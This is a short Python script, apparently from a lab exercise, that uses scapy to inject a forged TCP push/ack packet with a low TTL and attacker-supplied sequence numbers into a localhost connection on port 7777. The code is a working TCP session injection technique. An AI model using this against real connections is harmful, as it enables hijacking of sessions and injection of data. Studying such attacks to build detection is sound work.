#!/usr/bin/env python3

import sys
import scapy.all as scapy
import socket as so

scapy.conf.L3socket
scapy.conf.L3socket=scapy.L3RawSocket

msg = "This is an attack, look at my TTL!"

try:
    src_port = int(sys.argv[1].split()[0])
    dst_port = int(sys.argv[2].split()[0]) # should be 7777
    seq_nbr = int(sys.argv[3].split()[0], 16)
    ack_nbr = int(sys.argv[4].split()[0], 16)
except:
    print("[ERROR - Atcker] an error occured when launching the attacker script.")
    exit()

#print("SRC PORT: {}\nDST PORT: {}\nSEQ NBR: {}\nACK NBR: {}".format(src_port, dst_port, seq_nbr, ack_nbr))

ip=scapy.IP(src='127.0.0.1', dst='127.0.0.1', ttl=5)
PHACK = scapy.TCP(sport=src_port, dport=dst_port, flags='PA', seq=seq_nbr, ack=ack_nbr)
print("[Atcker] Sent packet with low TTL to server.")

scapy.send(ip/PHACK/msg)
